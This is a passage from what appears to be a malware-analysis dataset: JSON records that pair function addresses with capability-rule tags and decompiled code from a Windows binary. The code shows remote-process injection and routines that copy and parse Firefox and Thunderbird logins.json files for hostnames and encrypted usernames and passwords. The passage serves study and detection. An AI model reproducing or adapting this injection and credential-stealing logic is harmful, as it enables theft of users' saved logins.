(*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar4, \"XXXXXX\", 6, &var_4h);\n                if ((iVar4 != 0) && (var_4h == 6)) {\n                    lpNumberOfBytesWritten = 0;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar3, in_ECX);\n                    if ((iVar4 != 0) && (lpNumberOfBytesWritten == in_EDX)) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(iVar1, 0, 0, iVar3, 0, 0, 0);\n                        return uVar2;\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n        uVar2 = 0xfffffffe;\n    }\n    return uVar2;\n}\n",
        "token_count": 531
    },
    "00409cef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409cef(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint noname_2;\n    int32_t in_EDX;\n    uint arg_ch;\n    int64_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*0x41e694 == '\\0') {\n        iVar1 = fcn.0040a95a();\n        *0x41e694 = iVar1 != 0;\n    }\n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        iVar1 = fcn.00409b57();\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, iVar1);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.0040a976(0, 0);\n        arg_ch = iVar4 >> 0x20;\n        uVar2 = iVar4;\n        if (iVar4 != 0) {\n            var_8h = 0;\n            fcn.0040aacd(uVar2, arg_ch, noname_2, &var_8h);\n            iVar4 = fcn.0040a976(0x33370000, 0);\n            if (iVar4 != 0) {\n                arg_8h = 0;\n                iVar3 = fcn.0040a8ab(iVar4, iVar4 >> 0x20, 6, &arg_8h);\n                if ((iVar3 != 0) && (arg_8h == 6)) {\n                    arg_8h = 0;\n                    iVar3 = fcn.0040a8ab(uVar2, arg_ch, var_4h, &arg_8h);\n                    if ((iVar3 != 0) && (arg_8h == var_4h)) {\n                        uVar2 = fcn.0040aa22(iVar1, iVar1 >> 0x1f, uVar2, arg_ch);\n                        return uVar2;\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n        uVar2 = 0xfffffffe;\n    }\n    return uVar2;\n}\n",
        "token_count": 534
    },
    "0040a2d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.0040a2d1(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint var_5d0h;\n    int32_t var_5b8h;\n    uint *var_5b4h;\n    uint var_250h;\n    int32_t var_1f0h;\n    uint *var_1ech;\n    uint var_168h;\n    int32_t var_158h;\n    uint *var_154h;\n    int32_t var_110h;\n    uint *var_10ch;\n    uint *var_e0h;\n    uint var_dch;\n    uint var_b6h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint *var_4h;\n    \n    if (*0x41e698 != 0) {\n        iVar2 = fcn.0040a59d();\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if ((var_1f0h != 0) || (var_1ech != NULL)) {\n            return var_1ech;\n        }\n        var_4h = &var_168h;\n        if ((var_5b8h != 0) || (var_5b4h != NULL)) {\n            return var_5b4h;\n        }\n        var_14h = &var_110h;\n        var_1ch = 0x10;\n        var_20h = NULL;\n        var_110h = var_158h;\n        do {\n            if ((var_110h != 0) || (var_154h != NULL)) {\n                return var_154h;\n            }\n            var_10ch = var_154h;\n            var_4h = fcn.00401000(var_b6h);\n            if (var_4h == NULL) {\n                return NULL;\n            }\n            var_18h = var_b6h;\n            var_10h = &var_4h;\n            var_ch = CONCAT31(var_ch._1_3_, 1);\n            if (((var_b0h != 0) || (var_ach != 0)) && (var_18h != 0)) {\n                return var_4h;\n            }\n            iVar1 = fcn.0040a845();\n            if (iVar1 == 0) {\n                fcn.00402727();\n                return var_e0h;\n            }\n            fcn.00402727();\n            var_154h = var_10ch;\n        } while ((var_110h != var_1ch) || (var_10ch != var_20h));\n    }\n    return NULL;\n}\n",
        "token_count": 671
    },
    "0040a6de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __cdecl\nfcn.0040a6de(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_1ch_3;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h;\n    uint var_1ch_2;\n    uint var_18h;\n    uint var_14h_2;\n    uint var_10h;\n    \n    if (*0x41e698 != 0) {\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        return CONCAT44(var_44h >> 0x1f, 0x2b);\n    }\n    return 0;\n}\n",
        "token_count": 470
    },
    "0040ba2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ba2c(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar *lpString2;\n    uint uStack840;\n    char16_t *pcStack836;\n    uint32_t auStack832 [3];\n    uint uStack820;\n    code *pcStack816;\n    uint uStack812;\n    ulong uStack748;\n    uchar auStack740 [164];\n    uchar auStack576 [8];\n    uchar auStack568 [8];\n    uchar auStack560 [556];\n    \n    uStack812 = 0;\n    pcStack816 = 0x40ba44;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    iVar4 = *0x41e6a0;\n    pcStack816 = 0x800;\n    uStack820 = 0;\n    uStack748 = 0;\n    auStack832[2] = *0x41e6a0 + 0x210;\n    auStack832[1] = 0x40ba85;\n    fcn.00401293();\n    pcStack816 = 0x208;\n    uStack820 = 0;\n    auStack832[1] = 0x40ba99;\n    auStack832[2] = iVar4 + 0x10;\n    fcn.00401293();\n    uStack820 = 0;\n    auStack832[2] = 0;\n    auStack832[1] = 0x1c;\n    auStack832[0] = 0;\n    pcStack836 = 0x40baa8;\n    pcStack816 = iVar4 + 0x10;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    pcStack836 = L\"\\\\Microsoft Vision\\\\\";\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)();\n    if (*(*0x41e6a0 + 0xa14) != 0) {\n        fcn.00401293(&stack0xfffffdc8);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        (*pcVar1)(&stack0xfffffdc0, 0x419c98);\n        lpString2 = &stack0xfffffdd0;\n        fcn.0040460a(lpString2);\n        uVar3 = fcn.00413c83(lpString2);\n        fcn.00401fd0(uVar3);\n        fcn.00401586();\n    }\n    fcn.004043fa(0x419c9c);\n    uVar3 = fcn.004044c4();\n    fcn.004042c5(uVar3);\n    fcn.00406f1d();\n    uStack840 = 0;\n    if (*(*0x41e6a0 + 0xa14) != 0) {\n        (*_sym.imp.KERNEL32.dll_GetLocalTime)(&stack0xfffffcbc);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (&stack0xfffffd1c, L\"%02d-%02d-%02d_%02d.%02d.%02d\", pcStack836 >> 0x10, 0, 0, auStack832[0] & 0xffff\n                   , auStack832[0] >> 0x10, auStack832[1] & 0xffff);\n        fcn.004043fa(*0x41e6a0 + 0x10);\n        fcn.004043fa(&stack0xfffffd18);\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x41e6a0 + 0xc), 0x10000000, 1, 0, 2, 0x80, 0);\n        *(*0x41e6a0 + 4) = uVar3;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    pcStack816 = fcn.0040b347;\n    (*_sym.imp.USER32.dll_RegisterClassW)(&stack0xfffffccc);\n    uVar2 = (*_sym.imp.USER32.dll_CreateWindowExW)(0, 0, 0, 0, 0, 0, 0, 0, 0xfffffffd, 0, uVar2, arg_8h);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    puVar5 = &stack0xfffffcc0;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xfffffcc0, uVar2, 0, 0);\n    uVar3 = uStack840;\n    if (iVar4 != 0) {\n        do {\n            uVar3 = 0xffffffff;\n            if (iVar4 == -1) break;\n            (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffcb0);\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffcac);\n            iVar4 = (*pcVar1)(&stack0xfffffca8, uVar2, 0, 0);\n            uVar3 = uStack840;\n        } while (iVar4 != 0);\n    }\n    fcn.00406f1d();\n    return uVar3;\n}\n",
        "token_count": 1253
    },
    "0040bd1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040bd1d(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x552b20);\n    if (*0x5520f8 != 0) {\n        fcn.00402771();\n        *0x5520f8 = 0;\n        fcn.00402746(fcn.0040ab70, 0x5520f8);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x552b20);\n    return;\n}\n",
        "token_count": 113
    },
    "0040bd63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd63(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar2 = &lpCriticalSection;\n    puVar3 = 0x552b20;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x552b20);\n    *0x552b48 = arg_8h;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    *0x41e6a0 = 0x5520f8;\n    if (arg_ch == 0) {\n        fcn.00402771();\n        *0x5520f8 = 1;\n        fcn.00402746(fcn.0040ba2c, 0x5520f8);\n    }\n    else {\n        fcn.00402746(fcn.0040ab70, 0x5520f8);\n        *0x552b0c = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x552b20);\n    return;\n}\n",
        "token_count": 351
    },
    "00413ee1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413ee1(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 8));\n        *(param_1 + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0040c8fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040c8fc(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStackY16412 [8192];\n    uchar auStackY8220 [7964];\n    uint uStackY256;\n    uint uStackY252;\n    uint *arg_8h_00;\n    uchar *lpString;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x40c909;\n    fcn.00401230();\n    var_4h = 0x1000;\n    lpString = NULL;\n    var_10h = NULL;\n    var_ch = 0;\n    fcn.00401293();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    var_10h = &fcn.0040c8fc::var_4h;\n    lpString = &stack0xffffdfe4;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)();\n    if (iVar2 == 0) {\n        fcn.0040428f(&stack0xffffdfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.0040428f(&stack0xffffdfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.0040428f(&stack0xffffdfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.0040428f(&stack0xffffdfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.0040428f(&stack0xffffdfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401293();\n        fcn.0040cc6b(var_4h);\n        fcn.0040428f(&stack0xffffbfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401293();\n        fcn.0040cc6b(var_4h);\n        fcn.0040428f(&stack0xffffbfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401293();\n        fcn.0040cc6b(var_4h);\n        fcn.0040428f(&stack0xffffbfe4);\n    }\n    var_4h = 0x1000;\n    fcn.00401293();\n    iVar2 = (*pcVar1)();\n    if (iVar2 == 0) {\n        fcn.00401293();\n        uStackY252 = 0x40cc18;\n        fcn.0040cc6b(var_4h);\n        fcn.0040428f(&stack0xffffbfe4);\n    }\n    var_8h = 3;\n    if (lpString != NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        if (0 < iVar2) {\n            arg_8h_00 = &fcn.0040c8fc::lpString;\n            uStackY256 = 0x40cc52;\n            fcn.00402790(arg_8h_00);\n            uStackY256 = 0x40cc59;\n            fcn.0040283b(arg_8h_00);\n        }\n    }\n    fcn.004015d4();\n    return 1;\n}\n",
        "token_count": 1013
    },
    "0040cd01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cd01(int32_t lpString2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint var_4cch;\n    uint lpApplicationName;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_a4h;\n    uint var_a0h;\n    uint lpBinaryType;\n    int32_t var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t lpExistingFileName;\n    int32_t lpNewFileName;\n    \n    fcn.0040460a(L\"Profile\");\n    uVar5 = 0;\n    fcn.00401293();\n    lpBinaryType = 0;\n    fcn.00401293();\n    fcn.0040eb8e();\n    fcn.0040460a(&lpApplicationName);\n    (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)();\n    puVar6 = &var_34h;\n    fcn.00404656(puVar6);\n    iVar1 = fcn.0040df9d(puVar6);\n    if (iVar1 == 0) {\n        puVar6 = &var_34h;\n        fcn.00404656(puVar6);\n        iVar1 = fcn.0040df9d(puVar6);\n        if (iVar1 == 0) goto code_r0x0040d359;\n    }\n    fcn.004043fa(L\"\\\\Thunderbird\\\\\");\n    var_1ch = 0;\n    if (lpString2 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        var_1ch = fcn.00406f2c();\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n    }\n    fcn.004043fa(L\"profiles.ini\");\n    uVar5 = fcn.0040460a(L\"Profile\");\n    fcn.004043c7(uVar5);\n    fcn.00406f1d();\n    fcn.00404477(0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)();\n    iVar1 = 0;\n    while (iVar2 != 0) {\n        var_98h = iVar1 + 1;\n        uVar5 = fcn.0040460a(L\"Profile\");\n        fcn.004043c7(uVar5);\n        fcn.00406f1d();\n        var_38h = 0;\n        fcn.00404477(iVar1 + 1);\n        var_24h = 0;\n        if (lpString2 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            var_24h = fcn.00406f2c();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        }\n        fcn.004043fa(&var_4cch);\n        iVar1 = var_24h;\n        var_20h = NULL;\n        if (var_24h != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0x200);\n            uVar3 = fcn.00406f2c();\n            uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar1);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, iVar1, uVar4, uVar3, uVar5, 0, 0);\n            uVar5 = fcn.0040434f(uVar3);\n            fcn.0040415d(uVar5);\n            fcn.00406f1d();\n            fcn.00406f1d();\n        }\n        iVar2 = (**(var_14h + 0x84))();\n        if (((iVar2 == 0) && (var_94h = (**(var_14h + 0x9c))(),  var_94h != 0)) &&\n           (iVar2 = (**(var_14h + 0x98))(),  iVar2 == 0)) {\n            lpExistingFileName = 0;\n            if (iVar1 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                lpExistingFileName = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n            }\n            fcn.004043fa(L\"\\\\logins.json\");\n            fcn.00413915();\n            fcn.004043fa(0x4194e4);\n            uVar5 = fcn.004044c4();\n            fcn.004042c5(uVar5);\n            fcn.00406f1d();\n            var_3ch = 0;\n            fcn.004043fa(L\".tmp\");\n            iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)();\n            if (iVar1 != 0) {\n                fcn.004043c7(&lpNewFileName);\n            }\n            fcn.00413fc0();\n            var_b4h = 0;\n            if (lpExistingFileName != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                var_b4h = fcn.00406e8d();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n            }\n            iVar1 = fcn.00413f4f(0xc0000000);\n            if (iVar1 != 0) {\n                var_30h = 0;\n                var_2ch = 0;\n                fcn.00413b7c(&var_30h, var_a4h, 0);\n                fcn.0040434f(\"encryptedUsername\");\n                fcn.00403f58(&var_64h);\n                iVar1 = fcn.0040c354();\n                var_18h = iVar1;\n                fcn.00406f1d();\n                fcn.00406f1d();\n                while (iVar1 != 0) {\n                    var_60h = 0;\n                    var_5ch = 0;\n                    var_58h = 0;\n                    uVar5 = fcn.0040434f(\"hostname\");\n                    fcn.00403f58(&var_6ch);\n                    fcn.0040c38d(uVar5, var_18h);\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    uVar5 = fcn.0040434f(\"encryptedUsername\");\n                    fcn.00403f58(&var_74h);\n                    fcn.0040c38d(uVar5, var_18h);\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    uVar5 = fcn.0040434f(\"encryptedPassword\");\n                    fcn.00403f58(&var_7ch);\n                    fcn.0040c38d(uVar5, var_18h);\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    fcn.0040da6a(var_50h, &var_84h);\n                    fcn.0040da6a(var_4ch, &var_8ch);\n                    uVar5 = fcn.004040d5(&var_40h);\n                    fcn.004043c7(uVar5);\n                    fcn.00406f1d();\n                    var_40h = 0;\n                    fcn.0040434f(var_84h);\n                    uVar5 = fcn.004040d5(&var_44h);\n                    fcn.004043c7(uVar5);\n                    fcn.00406f1d();\n                    var_44h = 0;\n                    fcn.00406f1d();\n                    fcn.0040434f(var_8ch);\n                    uVar5 = fcn.004040d5(&var_48h);\n                    fcn.004043c7(uVar5);\n                    fcn.00406f1d();\n                    var_48h = 0;\n                    fcn.00406f1d();\n                    var_54h = 4;\n                    puVar6 = &var_60h;\n                    fcn.00402790(puVar6);\n                    fcn.0040283b(puVar6);\n                    iVar1 = var_18h + -1;\n                    var_18h = iVar1;\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                    fcn.004015d4();\n                }\n                iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)();\n                if (iVar1 != 0) {\n                    var_20h = &stack0xfffffad4;\n                    uVar5 = 0;\n                    puVar6 = &stack0xfffffad4;\n                    if (lpNewFileName != 0) {\n                        (*_sym.imp.KERNEL32.dll_lstrlenW)(lpNewFileName);\n                        uVar3 = fcn.00406f2c();\n                        iVar1 = lpNewFileName;\n                        *var_20h = uVar3;\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar3, iVar1);\n                        puVar6 = var_20h;\n                    }\n                    var_20h = puVar6;\n                    fcn.00413c34(uVar5);\n                }\n                (**(var_14h + 0xa0))();\n                (**(var_14h + 0x88))();\n                if (var_30h != 0) {\n                    fcn.00406f66();\n                }\n                var_30h = 0;\n            }\n            fcn.00413c16();\n            fcn.00406f1d();\n            lpNewFileName = 0;\n            fcn.00406f1d();\n        }\n        fcn.00406f1d();\n        fcn.00406f1d();\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)();\n        iVar1 = var_98h;\n    }\n    fcn.0040df46();\n    uVar5 = 1;\n    fcn.00406f1d();\ncode_r0x0040d359:\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return uVar5;\n}\n",
        "token_count": 2559
    },
    "0040d379": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d379(int32_t lpString)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint var_4cch;\n    uint lpApplicationName;\n    uint var_bch;\n    uint var_b8h;\n    uint var_a8h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t lpBinaryType;\n    char *var_3ch;\n    char *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *var_24h;\n    int32_t lpString2;\n    uint var_1ch;\n    int32_t var_18h;\n    uint lpAppName;\n    int32_t var_10h;\n    int32_t lpExistingFileName;\n    int32_t lpNewFileName;\n    \n    fcn.0040460a(L\"Profile\");\n    uVar7 = 0;\n    fcn.00401293();\n    lpBinaryType = 0;\n    fcn.00401293();\n    iVar2 = fcn.0040eb8e();\n    if (iVar2 != 0) {\n        fcn.0040460a(&lpApplicationName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)();\n        (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)();\n        if (lpBinaryType == 6) {\n            puVar8 = &lpString2;\n            fcn.00404656(puVar8);\n            iVar2 = fcn.0040e331(puVar8, puVar8);\n        }\n        else {\n            uVar5 = 0;\n            uVar4 = 0;\n            if (lpString2 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                uVar4 = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n            }\n            iVar2 = fcn.0040e331(uVar4, uVar5);\n        }\n        if (iVar2 != 0) {\n            fcn.004043fa(L\"\\\\Mozilla\\\\Firefox\\\\\");\n            var_1ch = 0;\n            if (lpString != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                var_1ch = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n            }\n            fcn.004043fa(L\"profiles.ini\");\n            uVar7 = fcn.0040460a(L\"Profile\");\n            fcn.004043c7(uVar7);\n            fcn.00406f1d();\n            fcn.00404477(0);\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)();\n            iVar2 = 0;\n            while (iVar3 != 0) {\n                var_a0h = iVar2 + 1;\n                uVar7 = fcn.0040460a(L\"Profile\");\n                fcn.004043c7(uVar7);\n                fcn.00406f1d();\n                var_44h = 0;\n                fcn.00404477(iVar2 + 1);\n                var_28h = 0;\n                if (lpString != 0) {\n                    (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                    var_28h = fcn.00406f2c();\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n                }\n                fcn.004043fa(&var_4cch);\n                iVar2 = var_28h;\n                var_24h = NULL;\n                if (var_28h != 0) {\n                    (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                    uVar7 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0x200);\n                    uVar4 = fcn.00406f2c();\n                    uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar2);\n                    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, iVar2, uVar5, uVar4, uVar7, 0, 0);\n                    uVar7 = fcn.0040434f(uVar4);\n                    fcn.0040415d(uVar7);\n                    fcn.00406f1d();\n                    fcn.00406f1d();\n                }\n                iVar3 = (**(var_10h + 0x84))();\n                if (((iVar3 == 0) && (var_9ch = (**(var_10h + 0x9c))(),  var_9ch != 0)) 